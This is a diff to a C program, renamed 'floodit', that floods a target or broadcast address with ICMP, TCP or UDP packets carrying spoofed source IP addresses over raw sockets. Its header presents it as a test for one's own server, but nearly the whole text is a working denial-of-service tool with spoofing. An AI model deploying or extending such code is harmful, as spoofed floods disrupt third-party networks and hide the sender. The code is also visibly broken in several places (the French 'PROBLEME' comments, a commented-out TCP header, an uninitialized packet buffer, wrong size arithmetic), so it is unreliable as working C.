@@ -1,12 +1,13 @@
 /***************************************************/
-/* floodICMP is created to understand how works    */
-/* IP and ICMP protocols. It send a modify datagram*/
-/* to a broadcast address. Use an analyser like    */
-/* wireshark to understand the operation.	   */
+/* floodit is used to test the security of your    */
+/* own server. It send ICMP, TCP or UDP packets    */
+/* with modify headers. You can spoof IP address,  */
+/* choose your target with IP broadcast...	   */
 /*						   */
-/* Compilation : gcc -o floodICMP floodicmp.c	   */
+/* Compilation : gcc -o floodit floodit.c	   */
 /* Run with root privilege : 			   */
-/* ./floodICMP 192.168.12.15 192.168.12.5 15000	   */
+/* ./floodit -h 	to get more information	   */
+/*						   */
 /* Contact : ride_online@hotmail.fr		   */
 /***************************************************/
 
@@ -66,7 +67,7 @@ void usage()
 /* Send UDP or ICMP packet */
 void sendflood_to(int sock, const char *packet, struct sockaddr_in *dest)
 {
-	if(sendto(sock, packet, sizeof(packet)*strlen(packet), 0, (struct sockaddr *) dest, sizeof(*dest)) == -1) {
+	if(sendto(sock, (const void *) packet, sizeof(packet)*strlen(packet), 0, (struct sockaddr *) dest, sizeof(*dest)) == -1) {
 		perror("sendto()");
 		exit(EXIT_FAILURE);
 	}
@@ -80,6 +81,58 @@ void sendflood(int sock, char *packet)
 		perror("send()");
 		exit(EXIT_FAILURE);
 	}
+}
+
+void send_inf_loop(char *proto, int sock, char *packet, struct iphdr *ip,
+				 struct sockaddr_in dest_addr, unsigned int speed)
+{
+	while(1) {
+		// Calculate checksums
+		ip->check = csum((unsigned short *)packet, ip->tot_len);
+
+		if(strncmp(proto,"icmp", 4) == 0)
+			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr));
+		else if(strncmp(proto,"udp", 3) == 0)
+			udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
+		else
+			tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
+
+		// Send packets
+		if(strstr(proto,"icmp") || strstr(proto,"udp"))
+			sendflood_to(sock, packet, &dest_addr);
+		else
+			sendflood(sock, packet);
+
+		usleep(speed^10);	// PROBLEME
+		printf(".");
+	}
+}
+
+void send_nloops(int nbpacket, char *proto, int sock, char *packet, struct iphdr *ip,
+					 struct sockaddr_in dest_addr, unsigned int speed)
+{
+	int i;
+
+	for(i = 0 ; i < nbpacket ; i++) {
+		// Calculate checksums
+		ip->check = csum((unsigned short *)packet, ip->tot_len);
+		if(strncmp(proto,"icmp", 4) == 0) 
+			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr));
+		else if(strncmp(proto,"udp", 3) == 0)
+			udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
+		else
+			tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
+		// Send packets
+		if(strstr(proto,"icmp") || strstr(proto,"udp"))
+			sendflood_to(sock, packet, &dest_addr);
+		else
+			sendflood(sock, packet);
+
+		usleep(speed ^ 100); // PROBLEME
+		printf(".");
+	}	
+
+	printf("\nDone : %d packets send !\n", i);
 }
 
 /* Fill the IP header */
@@ -108,10 +161,10 @@ void icmp_header()
 	icmp->un.echo.sequence = rand();
 }
 
-void tcp_header(int port_dst)
+void tcp_header(int port_dst) // PROBLEME DANS LE REMPLISSAGE
 {
 	// Fill the TCP header
-	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
+/*	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
 	tcp->dest = htons(port_dst);
 	tcp->seq = 0;
 	tcp->ack_seq = 0;
@@ -127,7 +180,7 @@ void tcp_header(int port_dst)
 	tcp->fin = 0;
 	tcp->window = 0;
 	tcp->check = 0;
-	tcp->urg_ptr = 0;
+	tcp->urg_ptr = 0;	*/
 }
 
 void udp_header(int port_dst)
@@ -140,8 +193,8 @@ void udp_header(int port_dst)
 }
 
 /* Init raw socket for flood ICMP */
-int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const char *payload,
-				 const char *target, const char *ip_dest, const char *packet, const char *proto, int port)
+int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const char *target,
+				  const char *ip_dest, char *packet, const char *proto, int port)
 {
 	int sock;
 	int sockopt = 1;	// Socket option : 1 = broadcast enable & IP HDR provide
@@ -166,17 +219,21 @@ int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const c
 	}
 
 	// Mounts the packet headers
-	icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
-	ip = (struct iphdr *) packet;
+	if(strncmp(proto, "icmp", 4) == 0)
+		icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
+	else if(strncmp(proto, "tcp", 3) == 0) 
+		tcp = (struct tcphdr *) (packet + sizeof(struct iphdr));
+	else  
+		udp = (struct udphdr *) (packet + sizeof(struct iphdr));
 
+	ip = (struct iphdr *) packet;
 
 	if(strncmp(proto, "icmp", 4) == 0) {
 		// Fill the IP header
 		ip_header(ip, sizeof(packet)*strlen(packet), 1, target, ip_dest);
 
 		printf("Flood ICMP\n");
-		icmp = malloc(sizeof(struct icmphdr));
-	
+
 		//Fill the ICMP header
 		icmp_header();
 	}
@@ -185,7 +242,6 @@ int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const c
 		ip_header(ip, sizeof(packet)*strlen(packet), 6, target, ip_dest);
 
 		printf("Flood TCP\n");
-		tcp = malloc(sizeof(struct tcphdr));
 
 		// Fill the TCP header
 		tcp_header(port);
@@ -195,14 +251,10 @@ int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const c
 		ip_header(ip, sizeof(packet)*strlen(packet), 17, target, ip_dest);
 
 		printf("Flood UDP\n");
-		udp = malloc(sizeof(struct udphdr));
 
 		// Fill the UDP header
 		udp_header(port);
 	}
-
-	// Include a small welcoming message !!
-//	memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), payload, strlen(payload));
 
 	// Interface dest
 	dest_addr->sin_family = AF_INET;
@@ -210,119 +262,26 @@ int init_raw_connection(struct iphdr *ip, struct sockaddr_in *dest_addr, const c
 	if(strncmp(proto, "icmp", 4) != 0)
 		dest_addr->sin_port = htons(port);
 
-	return sock;	
-}
-
-/* Init tcp socket for flood TCP /
-int init_tcp_connection(struct iphdr *ip, struct tcphdr *tcp, struct sockaddr_in *dest,
-					char *target, char *bad_ip, int port_dest, char *packet)
-{
-	int sockopt = 1;
-	int sock = socket(AF_INET, SOCK_STREAM, 0);
-
-	if(sock == -1) {
-		perror("socket()");
-		exit(EXIT_FAILURE);
-	}
-
-	// IP Header provide
-	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
-		perror("setsockopt()");
-		exit(EXIT_FAILURE);
-	}
-
-	// Mounts the packet headersw
-	tcp = (struct tcphdr *) (packet + sizeof(struct iphdr));
-	ip = (struct iphdr *) packet;
-
-	// Fill the IP header
-	ip_header(ip, 6, sizeof(packet), bad_ip, target);
-
-	// Fill the TCP header
-	while(tcp->source = rand(), (tcp->source < 1024) && (tcp->source > 65535));
-	tcp->dest = htons(port_dest);
-	tcp->seq = 0;
-	tcp->ack_seq = 0;
-	tcp->doff = 0;
-	tcp->res1 = 0;
-	tcp->cwr = 0;
-	tcp->ece = 0;
-	tcp->urg = 0;
-	tcp->ack = 0;
-	tcp->psh = 0;
-	tcp->rst = 0;
-	tcp->syn = 1;
-	tcp->fin = 0;
-	tcp->window = 0;
-	tcp->check = 0;
-	tcp->urg_ptr = 0;
-
-	dest->sin_family = AF_INET;
-	dest->sin_port = htons(port_dest);
-	dest->sin_addr.s_addr = inet_addr(target);
-
-	if(connect(sock, (struct sockaddr *) dest, sizeof(dest)) == -1) {
-		perror("connect()");
-		exit(EXIT_FAILURE);
-	}
+	if(strncmp(proto, "tcp", 3) == 0)
+		if(connect(sock, (struct sockaddr *) dest_addr, sizeof(dest_addr)) == -1) {
+			perror("connect()");
+			exit(EXIT_FAILURE);
+		}
 
 	return sock;
 }
 
-/ Init udp socket for flood UDP /
-int init_udp_connection(struct iphdr *ip, struct udphdr *udp, struct sockaddr_in *dest, 
-					char *target, char *bad_ip, int port_dest, char *packet)
-{
-	int sockopt = 1;
-	int sock = socket(AF_INET, SOCK_DGRAM, 0);
-
-	if(sock == -1) {
-		perror("socket()");
-		exit(EXIT_FAILURE);
-	}
-	
-	// IP Header provide
-	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &sockopt, sizeof(sockopt)) == -1) {
-		perror("setsockopt()");
-		exit(EXIT_FAILURE);
-	}
-
-	// Mounts the packet headers
-	udp = (struct udphdr *) (packet + sizeof(struct iphdr));
-	ip = (struct iphdr *) packet;
-
-	// Fill the IP header
-	ip_header(ip, 17, sizeof(packet), bad_ip, target);
-
-	// Fill the UDP header
-	while(udp->source = rand(), (udp->source < 1024) && (udp->source ) > 65535 );
-	udp->dest = htons(port_dest);
-	udp->len = 16;
-	udp->check = 0;
-
-	dest->sin_family = AF_INET;
-	dest->sin_port = htons(port_dest);
-	dest->sin_addr.s_addr = inet_addr(target);
-
-	return sock;	
-}
-*/
 int main(int argc, char **argv)
 {
 	struct iphdr *ip;	// Header IP
-	struct icmphdr *icmp;	// Header ICMP
-	struct tcphdr *tcp;	// Header TCP
-	struct udphdr *udp;	// Header UDP
 	struct sockaddr_in dest_addr;	// Interface dest
 	int sock;
 	int ch;
-	const char *payload = "Hello :)";	// Short msg inside
-	char packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(char)*strlen(payload)];	// Packet to send
-	unsigned int i = 0;
+	char *packet;	// Packet to send
 	char *proto = NULL;
 	char *ipaddr_spoofed = NULL;
 	unsigned int port = 80, speed = 1, nbpacket = 0; // Options by default
-	
+
 
 	if(getuid() != 0) {
 		printf("You must be root to run floodICMP\n");
@@ -337,16 +296,18 @@ int main(int argc, char **argv)
 	while((ch = getopt(argc, argv, "t:q:n:s:p:h")) != -1 ) {
 		switch(ch) {
 			case 't':
-				if(strncmp(optarg, "icmp", 4) != 0 || strncmp(optarg, "tcp", 3) != 0 || strncmp(optarg, "udp", 3) != 0) {
-					printf("Error with option -t (Only the values icmp, tcp or udp are available\n");
-					exit(EXIT_FAILURE);
-				}
-				
+// PROBLEME ENCODAGE || ??	if(strncmp(optarg, "icmp", 4) != 0 || strncmp(optarg, "tcp", 3) != 0 || strncmp(optarg, "udp", 3) != 0)
+	//			if(strncmp(optarg, "icmp", 4) != 0)
+	//			{
+	//				printf("Error with option -t (Only the values icmp, tcp or udp are available)\n");
+	//				exit(EXIT_FAILURE);
+	//			}
+
 				proto = optarg;
 				break;
 			case 'q':
 				speed = atoi(optarg);
-				if(speed > 3 && speed < 1) {
+				if(speed > 3 || (speed < 1)) {
 					printf("Error with option -q (Must be between 1 and 3)\n");
 					exit(EXIT_FAILURE);
 				}
@@ -370,15 +331,15 @@ int main(int argc, char **argv)
 	}
 
 	if(proto == NULL || ipaddr_spoofed == NULL) {
-		printf("Option -t and -s are missing\t --\tUse -h to get some help\n");
+		printf("Option -t or -s are missing\t --\tUse -h to get some help\n");
 		exit(EXIT_FAILURE);
 	}
 
 	printf("+---------------------------------------+\n");
 	printf("| Dst addr : %s\t\t\t|\n", argv[argc - 1]);
 	printf("| Src addr : %s \t\t\t|\n", ipaddr_spoofed);
-	if(strstr(proto,"icmp") == NULL)
-		printf("| Port : %d\t\t\t|\n", port);
+	if(strncmp(proto,"icmp", 4) != 0)
+		printf("| Port : %d\t\t\t\t|\n", port);
 	printf("| Nb packet : %d\t\t\t|\n", nbpacket);
 	printf("| Speed : %d\t\t\t\t|\n", speed);
 	printf("+---------------------------------------+\n\n");
@@ -387,51 +348,30 @@ int main(int argc, char **argv)
 	// Allocate memory
 	ip = malloc(sizeof(struct iphdr));
 
+/*	PROBLEME LORS DE L'INITIALISATION	
+	if(strncmp(proto, "icmp", 4) == 0) {
+		packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr));
+	//	memset(packet, sizeof(struct iphdr) + sizeof(struct icmphdr), 0);
+	}
+	else if(strncmp(proto, "tcp", 3) == 0) {
+		packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr));
+	//	memset(packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0);
+	}
+	else { 
+		packet = malloc(sizeof(struct iphdr) + sizeof(struct udphdr));
+	//	memset(packet, sizeof(struct iphdr) + sizeof(struct udphdr), 0);
+	}
+*/
 	// Init the different header	
-	sock = init_raw_connection(ip, &dest_addr, payload, ipaddr_spoofed, argv[argc - 1], packet, proto, port);
+	sock = init_raw_connection(ip, &dest_addr, ipaddr_spoofed, argv[argc - 1], packet, proto, port);
 
-	if(nbpacket == 0) while(1) {
-			// Calculate checksums
-			ip->check = csum((unsigned short *)packet, ip->tot_len);
-			if(strstr(proto,"icmp"))
-				icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
-		/*	else if(strstr(proto,"udp"))
-				udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
-			else
-				tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
-		*/
-			// Send packets
-			if(strstr(proto,"icmp") || strstr(proto,"udp"))
-				sendflood_to(sock, packet, &dest_addr);
-		/*	else
-				sendflood(sock, packet);
-		*/	
-			printf(".");
-			sleep(speed - 1);
-			i++;
-		}
-	else	for(i = 0 ; i < nbpacket ; i++) {
-			// Calculate checksums
-			ip->check = csum((unsigned short *)packet, ip->tot_len);
-			icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
-			if(strstr(proto,"icmp"))
-				icmp->checksum = csum((unsigned short *) icmp,  sizeof(struct icmphdr) + strlen(payload));
-		/*	else if(strstr(proto,"udp"))
-				udp->check = csum((unsigned short *) udp,  sizeof(struct udphdr));
-			else
-				tcp->check = csum((unsigned short *) tcp,  sizeof(struct tcphdr));
-		*/
-			// Send packets
-			if(strstr(proto,"icmp") || strstr(proto,"udp"))
-				sendflood_to(sock, packet, &dest_addr);
-		/*	else
-				sendflood(sock, packet);
-		*/
-			printf(".");
-			sleep(speed - 1);
-		}
+	if(nbpacket == 0)
+		send_inf_loop(proto,sock, packet, ip, dest_addr, speed);
+	else
+		send_nloops(nbpacket, proto, sock, packet, ip, dest_addr, speed);
 
-	printf("\nDone : %d packets send !\n", i);
+
+	free(ip);
 
 	close(sock);	// Close socket
 
